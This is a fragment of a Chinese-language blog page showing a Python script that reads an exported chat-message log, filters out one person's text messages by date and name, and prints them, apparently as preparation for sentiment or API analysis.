keyword">import</span> re</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>fileName <span class="token operator">=</span> <span class="token string">"语料分析.txt"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment"># 原始消息列表</span></pre></td></tr><tr><td data-num="6"></td><td><pre>girl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment"># 指定人消息列表</span></pre></td></tr><tr><td data-num="7"></td><td><pre>pattern <span class="token operator">=</span> <span class="token string">""</span> <span class="token comment"># 指定为日期，比如 2020-</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre> <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre> result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># 先暂存列表</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># 对列表进行过滤提取</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre> r <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre> r2 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"(.*)?梦"</span><span class="token punctuation">,</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 根据导出的消息记录中的名称调整</span></pre></td></tr><tr><td data-num="18"></td><td><pre> r2 <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre> r3 <span class="token operator">=</span> result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre> <span class="token keyword">if</span><span class="token punctuation">(</span>r3<span class="token operator">!=</span><span class="token string">"[图片]"</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre> list2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre> list2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r3<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre> girl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>list2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>girl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span>girl<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>girl<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="调用api分析"><a
